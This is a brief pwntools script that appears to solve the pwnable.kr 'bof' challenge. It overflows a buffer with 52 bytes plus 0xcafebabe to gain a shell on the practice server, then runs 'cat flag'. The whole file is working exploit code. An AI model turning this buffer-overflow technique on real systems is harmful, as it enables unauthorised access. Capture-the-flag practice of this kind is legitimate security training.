from pwn import *


payload = 'A'*52 + '\xbe\xba\xfe\xca'

shell = remote('pwnable.kr',9000)
shell.sendline(payload)
shell.sendline('cat flag')

print(shell.recvline().decode('utf-8'))

shell.close()
